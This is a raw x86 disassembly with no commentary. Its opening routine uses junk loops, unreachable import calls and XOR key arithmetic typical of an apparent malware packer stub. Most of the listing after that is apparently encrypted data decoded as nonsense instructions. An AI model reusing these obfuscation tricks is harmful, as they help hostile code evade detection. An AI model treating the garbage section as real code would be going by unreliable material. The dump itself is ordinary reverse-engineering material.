  419dc4:	xor    ebx,ebx
  419dc6:	xor    edx,0x8a29a123
  419dcc:	mov    ecx,eax
  419dce:	add    ecx,0xfabdbef1
  419dd4:	adc    ebx,0xffffffff
  419dd7:	xor    ecx,0x8a29a123
  419ddd:	xor    ebx,0x0
  419de0:	mov    DWORD PTR [ebp-0x20],eax
  419de3:	cmp    ecx,edx
  419de5:	jne    0x419d80
  419deb:	cmp    ebx,DWORD PTR [ebp-0x7c]
  419dee:	jne    0x419d80
  419df4:	mov    eax,DWORD PTR [ebp-0x1c]
  419df7:	mov    eax,DWORD PTR [eax]
  419df9:	pop    edi
  419dfa:	pop    esi
  419dfb:	pop    ebx
  419dfc:	leave  
  419dfd:	ret    0xc
  419e00:	push   ebp
  419e01:	mov    ebp,esp
  419e03:	sub    esp,0xa4
  419e09:	mov    DWORD PTR ds:0x42b000,0x1b
  419e13:	cmp    DWORD PTR ds:0x42b000,0x0
  419e1a:	je     0x419e69
  419e20:	cmp    DWORD PTR ds:0x42b000,0x4
  419e27:	jne    0x419e3b
  419e2d:	push   0x428000
  419e32:	push   DWORD PTR [ebp-0xc]
  419e35:	call   DWORD PTR ds:0x424014
  419e3b:	cmp    DWORD PTR ds:0x42b000,0x5
  419e42:	jne    0x419e57
  419e48:	xor    ecx,ecx
  419e4a:	xor    ecx,DWORD PTR ds:0x42b000
  419e50:	dec    ecx
  419e51:	mov    DWORD PTR ds:0x42b000,ecx
  419e57:	mov    ecx,DWORD PTR ds:0x42b000
  419e5d:	dec    ecx
  419e5e:	mov    DWORD PTR ds:0x42b000,ecx
  419e64:	jmp    0x419e13
  419e69:	mov    ecx,DWORD PTR [ebp+0x8]
  419e6c:	add    DWORD PTR ds:0x429004,0x326a
  419e76:	mov    eax,0x8a85
  419e7b:	sbb    DWORD PTR ds:0x42c014,0x42a000
  419e85:	xor    ax,WORD PTR [ecx+0x20]
  419e89:	sbb    ecx,DWORD PTR ds:0x42c008
  419e8f:	mov    ecx,0x3b4b
  419e94:	add    ax,cx
  419e97:	not    ecx
  419e99:	movzx  eax,ax
  419e9c:	mov    DWORD PTR [ebp-0x18],eax
  419e9f:	mov    BYTE PTR [ebp-0x1],0x61
  419ea3:	sub    DWORD PTR ds:0x429018,edi
  419ea9:	lea    eax,[ebp-0x1]
  419eac:	mov    DWORD PTR [ebp-0x10],eax
  419eaf:	mov    al,BYTE PTR [ebp-0x1]
  419eb2:	mov    DWORD PTR ds:0x42b018,0x13
  419ebc:	cmp    DWORD PTR ds:0x42b018,0x0
  419ec3:	je     0x419f16
  419ec9:	cmp    DWORD PTR ds:0x42b018,0x1f
  419ed0:	jne    0x419efe
  419ed6:	push   0x7696
  419edb:	push   0x42c01c
  419ee0:	push   0x4031
  419ee5:	push   0x429010
  419eea:	push   0x1f96
  419eef:	push   DWORD PTR [ebp-0x18]
  419ef2:	push   DWORD PTR [ebp-0x20]
  419ef5:	push   DWORD PTR [ebp-0x1c]
  419ef8:	call   DWORD PTR ds:0x424018
  419efe:	mov    ecx,DWORD PTR ds:0x42b018
  419f04:	dec    ecx
  419f05:	mov    DWORD PTR ds:0x42b018,ecx
  419f0b:	jmp    0x419ebc
  419f10:	sub    DWORD PTR ds:0x428008,ecx
  419f16:	mov    ecx,DWORD PTR [ebp-0x10]
  419f19:	xor    al,0x6f
  419f1b:	adc    DWORD PTR ds:0x429004,0x428004
  419f25:	sub    al,0xd
  419f27:	mov    BYTE PTR [ecx],al
  419f29:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  419f30:	and    DWORD PTR ds:0x428010,0x0
  419f3a:	jmp    0x419f4c
  419f3f:	mov    ecx,DWORD PTR ds:0x428010
  419f45:	inc    ecx
  419f46:	mov    DWORD PTR ds:0x428010,ecx
  419f4c:	cmp    DWORD PTR ds:0x428010,0x12
  419f53:	jae    0x419f77
  419f59:	cmp    DWORD PTR ds:0x428010,0x22
  419f60:	jne    0x419f71
  419f66:	push   0x80ee
  419f6b:	call   DWORD PTR ds:0x42401c
  419f71:	jmp    0x419f3f
  419f76:	inc    eax
  419f77:	push   ebx
  419f78:	and    DWORD PTR ds:0x428020,0x0
  419f82:	mov    eax,ds:0x428020
  419f87:	inc    eax
  419f88:	mov    ds:0x428020,eax
  419f8d:	cmp    DWORD PTR ds:0x428020,0x21
  419f94:	jne    0x419fa8
  419f9a:	push   0x12b4
  419f9f:	push   DWORD PTR [ebp-0xc]
  419fa2:	call   DWORD PTR ds:0x424020
  419fa8:	cmp    DWORD PTR ds:0x428020,0x16
  419faf:	jb     0x419f82
  419fb5:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  419fbc:	sub    eax,0x5057
  419fc1:	mov    ecx,DWORD PTR [ebp-0x14]
  419fc4:	xor    DWORD PTR ds:0x42a010,0x31a
  419fce:	push   esi
  419fcf:	and    DWORD PTR ds:0x42801c,0x42b000
  419fd9:	mov    eax,0x7510893
  419fde:	xor    ecx,eax
  419fe0:	mov    esi,0x3272db
  419fe5:	push   edi
  419fe6:	add    ecx,esi
  419fe8:	jmp    0x41a00c
  419fed:	mov    DWORD PTR ds:0x428010,0x3a90
  419ff7:	mov    dl,BYTE PTR [ebp-0x1]
  419ffa:	mov    DWORD PTR ds:0x42b000,0x1f96
  41a004:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41a00b:	inc    ecx
  41a00c:	mov    DWORD PTR ds:0x42b008,0x156a
  41a016:	cmp    ecx,0x40
  41a019:	mov    DWORD PTR ds:0x42b004,0x31d2
  41a023:	jb     0x419fed
  41a029:	sbb    edx,DWORD PTR ds:0x429018
  41a02f:	mov    edx,DWORD PTR [ebp-0x14]
  41a032:	dec    DWORD PTR ds:0x428028
  41a038:	xor    edx,eax
  41a03a:	add    edx,esi
  41a03c:	mov    DWORD PTR ds:0x42a00c,0x26bd
  41a046:	jmp    0x41c434
  41a04b:	mov    edi,DWORD PTR [ebp+0x8]
  41a04e:	jmp    0x41c3c9
  41a053:	ud1    esp,DWORD PTR [edx+edi*2-0x78941c5c]
  41a05b:	(bad)  
  41a05c:	mov    ch,0x8f
  41a05e:	std    
  41a05f:	stos   DWORD PTR es:[edi],eax
  41a060:	xchg   ebx,eax
  41a061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a062:	int3   
  41a063:	pop    edi
  41a064:	add    BYTE PTR [ecx+0x62],ah
  41a067:	add    al,0x5f
  41a069:	bound  esp,QWORD PTR [edx-0x24]
  41a06c:	arpl   WORD PTR [esi-0x5e7b2e86],di
  41a072:	adc    al,0x69
  41a074:	add    eax,0x5f74c42a
  41a079:	xor    esp,ebp
  41a07b:	aad    0x6d
  41a07d:	mov    edx,0xa5009040
  41a082:	sbb    ah,bl
  41a084:	dec    ebx
  41a085:	jg     0x41a037
  41a087:	test   bl,cl
  41a089:	mov    esp,0xd65ea544
  41a08e:	push   esi
  41a08f:	data16 int 0x2a
  41a092:	les    ebp,FWORD PTR [ebx]
  41a094:	xchg   esi,eax
  41a095:	sbb    ebp,ebp
  41a097:	jmp    eax
  41a099:	xchg   edx,eax
  41a09a:	sub    eax,0x219090fb
  41a09f:	jmp    0xff58:0x17abffef
  41a0a6:	pop    ebp
  41a0a7:	mov    ds:0x93fdb95d,al
  41a0ac:	mov    ebx,edi
  41a0ae:	fld    DWORD PTR [edi+0x202c2fc]
  41a0b4:	std    
  41a0b5:	loop   0x41a12f
  41a0b7:	mov    bh,0xb4
  41a0b9:	mov    ch,0xa0
  41a0bb:	xor    DWORD PTR [edi+ebx*4-0x1b],ebp
  41a0bf:	jbe    0x41a050
  41a0c1:	cdq    
  41a0c2:	shl    dh,1
  41a0c4:	dec    eax
  41a0c6:	call   0xf768:0x2e75a886
  41a0cd:	call   0x1897:0x3925fc9f
  41a0d4:	jle    0x41a05d
  41a0d6:	xchg   ecx,eax
  41a0d7:	mov    dh,0x0
  41a0d9:	out    0x26,eax
  41a0db:	or     al,0xd5
  41a0dd:	call   0xb413:0x61f6aefa
  41a0e4:	lods   eax,DWORD PTR ds:[esi]
  41a0e5:	stos   BYTE PTR es:[edi],al
  41a0e6:	jae    0x41a122
  41a0e8:	or     al,0x76
  41a0ea:	mov    ds:0xdc8023ac,al
  41a0ef:	mov    ebp,DWORD PTR ds:0xe6d8457
  41a0f5:	jmp    0x4f8b:0xeed2b746
  41a0fc:	or     DWORD PTR [ecx+eax*1+0x448a0242],eax
  41a103:	mov    cl,0x14
  41a105:	sub    bl,BYTE PTR [edi]
  41a107:	pop    ecx
  41a108:	lahf   
  41a109:	mov    eax,ds:0x33ae502
  41a10e:	jecxz  0x41a115
  41a110:	ins    BYTE PTR es:[edi],dx
  41a111:	pop    es
  41a112:	ror    BYTE PTR [edx+0x40],1
  41a115:	mov    edx,0x433cb7a
  41a11a:	mov    bh,0x5e
  41a11c:	sub    ecx,DWORD PTR [edi-0x29]
  41a11f:	inc    ebx
  41a120:	cmp    esp,DWORD PTR [ebp-0x33]
  41a123:	or     bl,bl
  41a125:	push   DWORD PTR [edi-0x1c]
  41a128:	pusha  
  41a129:	(bad)  
  41a12b:	test   esp,ecx
  41a12d:	test   eax,0xe3486240
  41a132:	or     dh,ah
  41a134:	scas   al,BYTE PTR es:[edi]
  41a135:	div    DWORD PTR [edx+esi*4]
  41a138:	push   eax
  41a139:	cmp    dh,BYTE PTR [esi+ebx*4]
  41a13c:	mov    DWORD PTR [esi],eax
  41a13e:	dec    eax
  41a13f:	test   al,0x42
  41a141:	mov    dh,0xec
  41a143:	adc    BYTE PTR [edx+edi*1-0x22],dl
  41a147:	sbb    BYTE PTR [esp+edx*2],ch
  41a14a:	xor    dh,al
  41a14c:	xchg   esp,eax
  41a14d:	xor    BYTE PTR [esi-0x237f7ea2],bl
  41a153:	sbb    ebp,DWORD PTR [ecx+0x5d]
  41a156:	xor    eax,DWORD PTR [edi+esi*8]
  41a159:	jmp    0x9fb3:0x5a05dfb9
  41a160:	adc    bh,bl
  41a162:	repnz cmp al,0xff
  41a165:	add    eax,DWORD PTR [ebp-0x7]
  41a168:	in     al,0xde
  41a16a:	int3   
  41a16b:	adc    BYTE PTR [edi-0x5],al
  41a16e:	in     eax,dx
  41a16f:	mov    ecx,0x461b2ec0
  41a174:	pop    ebx
  41a175:	test   al,0x5d
  41a177:	xor    ebp,DWORD PTR [esi+0x3c1f1ae2]
  41a17d:	pop    eax
  41a17e:	sbb    al,0x99
  41a180:	mov    bl,0xf9
  41a182:	mov    BYTE PTR [edi+0x48],0x69
  41a186:	sbb    eax,0x5866f939
  41a18b:	imul   ebx,DWORD PTR [edx-0x3c3884b5],0xffffffce
  41a192:	and    eax,DWORD PTR [eax-0x6]
  41a195:	das    
  41a196:	mov    dl,0x60
  41a198:	rol    BYTE PTR [eax],0x8
  41a19b:	sub    DWORD PTR [edi],0x148aa3f5
  41a1a1:	push   edi
  41a1a2:	add    DWORD PTR [edi+0x7742756b],edx
  41a1a8:	imul   eax,DWORD PTR [eax],0xc210258a
  41a1ae:	leave  
  41a1af:	mov    eax,0x3b3c88fe
  41a1b4:	push   cs
  41a1b5:	sbb    ebp,DWORD PTR [ecx]
  41a1b7:	mov    ch,BYTE PTR [edi+0x5840f3f9]
  41a1bd:	in     eax,dx
  41a1be:	call   0x982c:0x678116e3
  41a1c5:	sub    BYTE PTR [eax],ah
  41a1c7:	xchg   esi,eax
  41a1c8:	xor    al,0x48
  41a1ca:	pop    esi
  41a1cb:	pop    ss
  41a1cc:	inc    ecx
  41a1cd:	ss scas eax,DWORD PTR es:[edi]
  41a1cf:	sahf   
  41a1d0:	(bad)  
  41a1d1:	xor    eax,0x56290fff
  41a1d6:	dec    ebx
  41a1d7:	inc    ebp
  41a1d8:	mov    ebx,0x21347d1f
  41a1dd:	add    eax,0x3b110192
  41a1e2:	ins    BYTE PTR es:[edi],dx
  41a1e3:	ja     0x41a1d3
  41a1e5:	je     0x41a260
  41a1e7:	retf   
  41a1e8:	out    0x3b,eax
  41a1ea:	retf   0x9a4c
  41a1ed:	ret    0x5a21
  41a1f0:	(bad)  
  41a1f1:	push   ebx
  41a1f2:	mov    ebp,DWORD PTR [edx-0x28c050f8]
  41a1f8:	xor    al,0x63
  41a1fa:	pop    ebx
  41a1fb:	jb     0x41a229
  41a1fd:	loop   0x41a1ef
  41a1ff:	push   ebp
  41a200:	and    al,0xc0
  41a202:	adc    DWORD PTR [ebx+0x74],edx
  41a205:	sub    edx,ecx
  41a207:	xchg   ebx,eax
  41a208:	repnz loope 0x41a1d6
  41a20b:	shr    BYTE PTR [edi+0x33c50c6],0xf0
  41a212:	mov    ds:0x99565c99,al
  41a217:	pop    esp
  41a218:	push   edi
  41a219:	push   ds
  41a21a:	jns    0x41a1b3
  41a21c:	add    eax,0x129ea79d
  41a221:	cmc    
  41a222:	xor    BYTE PTR [bx+di-0x8],0x76
  41a227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a228:	or     eax,0x44798a40
  41a22d:	out    dx,eax
  41a22e:	adc    eax,0x49737fec
  41a233:	sbb    bh,BYTE PTR [edi+0x47a5b82a]
  41a239:	lods   al,BYTE PTR ds:[esi]
  41a23a:	xor    BYTE PTR [ecx+0x75],al
  41a23d:	or     eax,DWORD PTR [eax-0x2393a7bf]
  41a243:	jecxz  0x41a252
  41a245:	jp     0x41a22b
  41a247:	in     eax,0x54
  41a249:	xor    al,0x54
  41a24b:	dec    edi
  41a24c:	push   esp
  41a24d:	add    ch,BYTE PTR [edi+eax*1+0xd]
  41a251:	sub    eax,0x89d0fbde
  41a256:	inc    esp
  41a257:	push   esp
  41a258:	lds    edx,FWORD PTR [ebp-0x104b32ae]
  41a25e:	mov    edx,0x5a04c70b
  41a263:	push   0x5e889de2
  41a268:	inc    ecx
  41a269:	addr16 mov edi,ebp
  41a26c:	sbb    eax,0x5ddbc375
  41a271:	cmp    ch,bl
  41a273:	iret   
  41a274:	repnz mov cl,BYTE PTR [esp+ecx*4+0x47196d78]
  41a27c:	cmp    BYTE PTR [edi],bh
  41a27e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a27f:	inc    edx
  41a280:	push   esi
  41a281:	js     0x41a2a4
  41a283:	ja     0x41a2b7
  41a285:	int    0x31
  41a287:	mov    ecx,0x2b57b5aa
  41a28c:	xchg   DWORD PTR [esi+ecx*2+0x14],eax
  41a290:	pop    edx
  41a291:	mov    DWORD PTR [edx-0x12891be0],edi
  41a297:	test   BYTE PTR [edx+0x74],cl
  41a29a:	adc    BYTE PTR [eax-0xc76f913],0x7e
  41a2a1:	lods   eax,DWORD PTR ds:[esi]
  41a2a2:	dec    ecx
  41a2a3:	or     al,0x2c
  41a2a5:	ror    BYTE PTR [eax],cl
  41a2a7:	ins    BYTE PTR es:[edi],dx
  41a2a8:	(bad)  
  41a2a9:	sub    al,0x57
  41a2ab:	or     dh,ch
  41a2ad:	sub    ecx,DWORD PTR [eax-0x467ab20a]
  41a2b3:	xchg   ebp,eax
  41a2b4:	push   edi
  41a2b5:	pop    eax
  41a2b6:	(bad)  
  41a2b7:	pop    ds
  41a2b8:	cmp    BYTE PTR [esi+0x56],0x47
  41a2bc:	out    0xa5,eax
  41a2be:	imul   ebx,DWORD PTR [ebp-0x1f],0x5056a91
  41a2c5:	cmp    al,0xc7
  41a2c7:	stos   DWORD PTR es:[edi],eax
  41a2c8:	mov    cl,0x3a
  41a2ca:	in     eax,0x50
  41a2cc:	ds push 0xc5d5a691
  41a2d2:	retf   
  41a2d3:	stos   DWORD PTR es:[edi],eax
  41a2d4:	int    0xe7
  41a2d6:	lock add ah,cl
  41a2d9:	daa    
  41a2da:	adc    BYTE PTR [ecx-0x27],bh
  41a2dd:	fisub  WORD PTR [edi]
  41a2df:	sbb    al,0x79
  41a2e1:	cli    
  41a2e2:	sbb    eax,0x5e47083b
  41a2e7:	xchg   DWORD PTR [ecx+0x7b],esi
  41a2ea:	pop    ecx
  41a2eb:	(bad)
  41a2ee:	hlt    
  41a2ef:	out    dx,eax
  41a2f0:	cli    
  41a2f1:	dec    edx
  41a2f2:	shl    DWORD PTR [eax],cl
  41a2f4:	ins    DWORD PTR es:[edi],dx
  41a2f5:	retf   0xe1c3
  41a2f8:	jnp    0x41a373
  41a2fa:	jo     0x41a2d7
  41a2fc:	jmp    FWORD PTR [edx-0x40da210c]
  41a302:	ja     0x41a2b8
  41a304:	scas   al,BYTE PTR es:[edi]
  41a305:	mov    edi,0xb0151c8d
  41a30a:	xor    edi,DWORD PTR [ebp+0x5b]
  41a30d:	mov    ds:0x539e8d3a,al
  41a312:	sub    al,0xc2
  41a314:	rol    DWORD PTR [esi*1-0x19fff54d],0xd2
  41a31c:	mov    ch,0xd3
  41a31e:	sbb    al,0x8d
  41a320:	and    esi,DWORD PTR [ecx+0x52c9ad49]
  41a326:	or     al,BYTE PTR [ecx-0x110cee68]
  41a32c:	out    dx,eax
  41a32d:	rcl    DWORD PTR [esi+0x3b1e2a95],cl
  41a333:	inc    edi
  41a334:	rcr    BYTE PTR [eax+0x3],1
  41a337:	lods   eax,DWORD PTR ds:[esi]
  41a338:	inc    ebx
  41a339:	es push edi
  41a33b:	dec    ecx
  41a33c:	inc    ebx
  41a33d:	jle    0x41a36e
  41a33f:	outs   dx,BYTE PTR ds:[esi]
  41a340:	pusha  
  41a341:	sbb    eax,0xdb2ddac
  41a346:	inc    ebp
  41a347:	or     edx,0x35506a97
  41a34d:	scas   al,BYTE PTR es:[edi]
  41a34e:	jmp    0xaec3:0x9ab3d477
  41a355:	or     edx,DWORD PTR [edi]
  41a357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a358:	mov    esp,0x7b579513
  41a35d:	xchg   BYTE PTR [ebp+0x6fdabd87],dh
  41a363:	fiadd  WORD PTR [esp+edx*2]
  41a366:	sti    
  41a367:	cli    
  41a368:	push   esi
  41a369:	mov    ds:0x23aaa151,eax
  41a36e:	iret   
  41a36f:	hlt    
  41a370:	pop    ebp
  41a371:	push   edi
  41a372:	stos   BYTE PTR es:[edi],al
  41a373:	shl    esi,cl
  41a375:	arpl   bx,di
  41a377:	dec    edx
  41a378:	and    ch,BYTE PTR [edi]
  41a37a:	ret    
  41a37b:	outs   dx,DWORD PTR ds:[esi]
  41a37c:	push   esi
  41a37d:	inc    ecx
  41a37e:	inc    edi
  41a37f:	int    0x12
  41a381:	es in  al,0x7f
  41a384:	shl    DWORD PTR [edi],0xc1
  41a387:	mov    bh,0xbf
  41a389:	je     0x41a3a0
  41a38b:	push   cs
  41a38c:	jb     0x41a3a9
  41a38e:	cmp    al,0x84
  41a390:	inc    esp
  41a391:	fild   QWORD PTR [ecx]
  41a393:	add    BYTE PTR [ebx],cl
  41a395:	xchg   DWORD PTR [esi+0xa6da641],ebp
  41a39b:	fidiv  DWORD PTR [ecx-0x2126e74b]
  41a3a1:	sub    bl,ch
  41a3a3:	xlat   BYTE PTR ds:[ebx]
  41a3a4:	inc    esi
  41a3a5:	sub    ebx,ecx
  41a3a7:	outs   dx,BYTE PTR ds:[esi]
  41a3a8:	js     0x41a401
  41a3aa:	bound  eax,QWORD PTR [edx-0x27dbf2bc]
  41a3b0:	sbb    edi,DWORD PTR [edx-0x5]
  41a3b3:	pop    edx
  41a3b4:	sub    esp,DWORD PTR [esi-0x8]
  41a3b7:	test   al,0x88
  41a3b9:	jns    0x41a3c8
  41a3bb:	test   al,0x4e
  41a3bd:	push   es
  41a3be:	sbb    eax,0x82b732ed
  41a3c3:	idiv   DWORD PTR [ecx+0x7]
  41a3c6:	push   es
  41a3c7:	jbe    0x41a43e
  41a3c9:	pushf  
  41a3ca:	ror    esi,cl
  41a3cc:	push   edi
  41a3cd:	iret   
  41a3ce:	mov    esp,eax
  41a3d0:	pop    esi
  41a3d1:	and    al,0x4a
  41a3d3:	loopne 0x41a3b1
  41a3d5:	arpl   WORD PTR [ebx],ax
  41a3d7:	mov    WORD PTR [edi+0x7f2f68be],ds
  41a3dd:	retf   0x50f
  41a3e0:	stos   BYTE PTR es:[edi],al
  41a3e1:	(bad)  
  41a3e2:	ins    DWORD PTR es:[edi],dx
  41a3e3:	xor    DWORD PTR [eax],edx
  41a3e5:	jnp    0x41a3de
  41a3e7:	arpl   WORD PTR [eax+0x6b548a29],di
  41a3ed:	shr    BYTE PTR [edx],1
  41a3ef:	(bad)  
  41a3f0:	sbb    al,BYTE PTR [ebx+eiz*2+0x6c]
  41a3f4:	push   edi
  41a3f5:	ins    DWORD PTR es:[edi],dx
  41a3f6:	repz push ecx
  41a3f8:	call   0x28f7:0xd413101e
  41a3ff:	jns    0x41a3f3
  41a401:	rol    al,cl
  41a403:	pop    esp
  41a404:	mov    esp,0x21497b3
  41a409:	clc    
  41a40a:	ret    0xf8ad
  41a40d:	retf   0x317c
  41a410:	jge    0x41a448
  41a412:	xchg   BYTE PTR [esi],ch
  41a414:	jmp    0xec43:0x9d30a58b
  41a41b:	inc    ebp
  41a41c:	out    dx,eax
  41a41d:	clc    
  41a41e:	in     al,0x20
  41a420:	sub    cl,BYTE PTR [esi+0x58]
  41a423:	lock (bad) 
  41a425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a426:	repnz arpl WORD PTR es:[ebp+0x5fa5af0c],sp
  41a42e:	inc    ecx
  41a42f:	pop    es
  41a430:	lahf   
  41a431:	hlt    
  41a432:	fadd   QWORD PTR [edi+0x4c60280f]
  41a438:	cmc    
  41a439:	pop    ebx
  41a43a:	jge    0x41a431
  41a43c:	arpl   WORD PTR [edx],sp
  41a43e:	jnp    0x41a447
  41a440:	dec    esp
  41a441:	mul    DWORD PTR [ecx+0x37]
  41a444:	inc    eax
  41a445:	pop    es
  41a446:	cdq    
  41a447:	mov    eax,ds:0xc5d8f577
  41a44c:	mov    ah,0x92
  41a44e:	dec    BYTE PTR [ecx+0x55]
  41a451:	dec    edi
  41a452:	cld    
  41a453:	adc    eax,0x96e5fa59
  41a458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a459:	loop   0x41a410
  41a45b:	add    BYTE PTR ds:0x25f8b142,ch
  41a461:	mov    eax,fs:0xc8fee84
  41a467:	inc    eax
  41a468:	int3   
  41a469:	shl    DWORD PTR [ebp-0x1cb408e2],0x21
  41a470:	adc    BYTE PTR [eax+ecx*8],0x5
  41a474:	pop    DWORD PTR [eax-0x7d]
  41a477:	shr    edi,0x7b
  41a47a:	add    eax,0x846e1a94
  41a47f:	retf   
  41a480:	mov    eax,0xed97b1c9
  41a485:	cmp    dl,BYTE PTR [edx-0x44]
  41a488:	lods   al,BYTE PTR ds:[esi]
  41a489:	push   ebx
  41a48a:	nop
  41a48b:	retf   0x96f5
  41a48e:	mov    edi,0xbaa2de6
  41a493:	fsubr  QWORD PTR [edx+edi*1-0x2a3f6680]
  41a49a:	pop    edi
  41a49b:	and    ebx,DWORD PTR [ebx-0x25]
  41a49e:	popf   
  41a49f:	and    ecx,DWORD PTR [eax]
  41a4a1:	cmp    dh,BYTE PTR [edi]
  41a4a3:	push   edi
  41a4a4:	loop   0x41a47d
  41a4a6:	nop
  41a4a7:	imul   ebx,edx,0xffffffce
  41a4aa:	mov    BYTE PTR [edi+esi*4],ch
  41a4ad:	sbb    ch,dh
  41a4af:	cmp    eax,ecx
  41a4b1:	test   al,0x1c
  41a4b3:	test   eax,0x3b959d23
  41a4b8:	leave  
  41a4b9:	xchg   esp,eax
  41a4ba:	stos   BYTE PTR es:[edi],al
  41a4bb:	mov    dl,0xfa
  41a4bd:	mov    edi,0xc68adef0
  41a4c2:	loopne 0x41a4b1
  41a4c4:	icebp  
  41a4c5:	into   
  41a4c6:	rol    BYTE PTR [edx],cl
  41a4c8:	adc    al,0xb4
  41a4ca:	test   al,0xdf
  41a4cc:	clc    
  41a4cd:	cdq    
  41a4ce:	mov    bl,0x61
  41a4d0:	push   ecx
  41a4d1:	push   ss
  41a4d2:	mov    bh,0x90
  41a4d4:	cmp    DWORD PTR [esi],0x44
  41a4d7:	push   cs
  41a4d8:	mov    ds:0x28f2eb6d,al
  41a4dd:	popf   
  41a4de:	pop    ecx
  41a4df:	out    dx,eax
  41a4e0:	jle    0x41a488
  41a4e2:	or     eax,esp
  41a4e4:	cmc    
  41a4e5:	and    eax,0xb4363735
  41a4ea:	lods   al,BYTE PTR ds:[esi]
  41a4eb:	out    0x33,eax
  41a4ed:	xor    BYTE PTR [ecx+0x50],cl
  41a4f0:	dec    esi
  41a4f1:	pushf  
  41a4f2:	(bad)  
  41a4f3:	adc    DWORD PTR [eax+0x37],esp
  41a4f6:	jns    0x41a552
  41a4f8:	test   eax,0x8ec3c66a
  41a4fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4fe:	ja     0x41a4c9
  41a500:	fstp   TBYTE PTR [edi-0x3d]
  41a503:	sar    DWORD PTR [ecx],cl
  41a505:	pop    es
  41a506:	and    al,0x27
  41a508:	push   ecx
  41a509:	aad    0x72
  41a50b:	sub    BYTE PTR [edi+edi*8],bl
  41a50e:	mov    bl,dh
  41a510:	inc    edx
  41a511:	xor    eax,0xf8a3efe5
  41a516:	je     0x41a543
  41a518:	push   0xffffff86
  41a51a:	cmp    al,0x69
  41a51c:	mov    cl,0x0
  41a51e:	xor    al,bl
  41a520:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a521:	or     DWORD PTR [eax-0x6c3ceaae],0x79bdc094
  41a52b:	sub    eax,0x217a08f1
  41a530:	test   esp,eax
  41a532:	enter  0xa2dc,0x1
  41a536:	retf   
  41a537:	mov    edx,0x158d0a8f
  41a53c:	sub    DWORD PTR [ebp+edi*8-0x78458fd1],edx
  41a543:	pop    ss
  41a544:	sahf   
  41a545:	mov    eax,ds:0x1430f45
  41a54a:	add    DWORD PTR [ebx+0x3c01e2ff],edi
  41a550:	and    eax,0x6a17f629
  41a555:	or     BYTE PTR [eax+0x6f2a0bb6],bh
  41a55b:	and    al,0xca
  41a55d:	jmp    0x41a5d9
  41a55f:	xchg   ebx,eax
  41a560:	shl    BYTE PTR [eax+0x3be45053],1
  41a566:	mov    esp,0x2430b930
  41a56b:	iret   
  41a56c:	inc    esi
  41a56e:	push   ebp
  41a56f:	les    edx,FWORD PTR [edi-0x517e224c]
  41a575:	xchg   edi,eax
  41a576:	cli    
  41a577:	mov    ecx,fs
  41a579:	adc    ch,ch
  41a57b:	fwait
  41a57c:	xchg   ebx,eax
  41a57d:	push   cs
  41a57e:	xor    edx,DWORD PTR [ebx+0x69]
  41a581:	(bad)  
  41a582:	rcl    BYTE PTR [ebx+0x49],1
  41a585:	into   
  41a586:	iret   
  41a587:	cmp    al,0xa2
  41a589:	fcmovbe st,st(1)
  41a58b:	in     al,dx
  41a58c:	add    bl,bl
  41a58e:	in     al,0xa9
  41a590:	jbe    0x41a5e4
  41a592:	cdq    
  41a593:	lods   al,BYTE PTR ds:[esi]
  41a594:	jl     0x41a60d
  41a596:	adc    eax,0xb747b583
  41a59b:	mov    dh,0xe
  41a59d:	cld    
  41a59e:	sti    
  41a59f:	push   0xd87a92a0
  41a5a4:	inc    edx
  41a5a5:	loopne 0x41a59c
  41a5a7:	sbb    bl,BYTE PTR [edi-0x65cfae3a]
  41a5ad:	mov    esi,0x6fe7fbd3
  41a5b2:	adc    al,0x74
  41a5b4:	mov    eax,0x30d696b0
  41a5b9:	jno    0x41a612
  41a5bb:	ret    0x8ba0
  41a5be:	fisub  WORD PTR [edi-0x5b]
  41a5c1:	push   0xc6e823c6
  41a5c6:	das    
  41a5c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5c8:	xor    al,0xc3
  41a5ca:	(bad)  
  41a5cb:	xor    al,0x4e
  41a5cd:	mov    eax,ds:0x218e202f
  41a5d2:	push   ebp
  41a5d3:	xchg   edx,eax
  41a5d4:	push   ebx
  41a5d5:	cmp    eax,0x81cdd292
  41a5da:	or     DWORD PTR [ecx-0xa],edi
  41a5dd:	or     al,0xc2
  41a5df:	repnz push ebp
  41a5e1:	ins    BYTE PTR es:[edi],dx
  41a5e2:	repz pop ebx
  41a5e4:	and    eax,DWORD PTR [edi]
  41a5e6:	js     0x41a5bc
  41a5e8:	pop    ebp
  41a5e9:	pop    edx
  41a5ea:	xor    eax,0xdd22f74c
  41a5ef:	retf   
  41a5f0:	mov    ds:0x21de5807,eax
  41a5f5:	mov    edx,0xbfaa0d09
  41a5fa:	mov    ch,ah
  41a5fc:	cmc    
  41a5fd:	xor    edx,DWORD PTR [edi-0x3e2e3496]
  41a603:	mov    al,0xe4
  41a605:	mov    dh,0x67
  41a607:	add    ah,BYTE PTR [ebx]
  41a609:	cld    
  41a60a:	in     eax,dx
  41a60b:	shr    BYTE PTR [ebp+0x4d9b9202],0x9b
  41a612:	imul   edi,DWORD PTR [edx+ebx*2-0x3e],0xac1cce1f
  41a61a:	jge    0x41a5ef
  41a61c:	mov    ds:0xab7e1d62,al
  41a621:	dec    ebx
  41a622:	scas   al,BYTE PTR es:[edi]
  41a623:	retf   
  41a624:	idiv   bl
  41a626:	pop    edx
  41a627:	and    BYTE PTR [ecx],cl
  41a629:	or     eax,DWORD PTR [ecx+0x65b231cf]
  41a62f:	and    ah,0x8d
  41a632:	enter  0xaa46,0x25
  41a636:	leave  
  41a637:	aas    
  41a638:	inc    esp
  41a639:	mov    al,0xa6
  41a63b:	sbb    ebp,DWORD PTR [eax+0x2c]
  41a63e:	sbb    bl,BYTE PTR [ebx+0x4c]
  41a641:	(bad)  
  41a643:	mov    ch,0xe5
  41a645:	mov    bl,BYTE PTR [eax]
  41a647:	sub    eax,0x6286e02b
  41a64c:	(bad)  
  41a64d:	and    BYTE PTR [ecx+0xf631a6b],ah
  41a653:	mov    WORD PTR [ecx-0x5e],fs
  41a656:	ret    
